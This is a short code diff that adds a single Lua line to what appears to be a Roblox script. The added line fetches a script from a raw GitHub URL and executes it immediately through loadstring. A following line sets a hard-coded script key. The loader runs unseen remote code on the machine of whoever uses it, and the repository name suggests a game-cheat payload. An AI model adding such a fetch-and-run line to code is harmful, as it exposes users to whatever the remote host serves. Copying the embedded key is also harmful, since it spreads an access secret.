@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/raidersvin/ps99vin/refs/heads/main/scriptphu"))()
 
 script_key = "IAMAiZhmvPSarFAwYGimVtcLzrqIAnAQ";
 
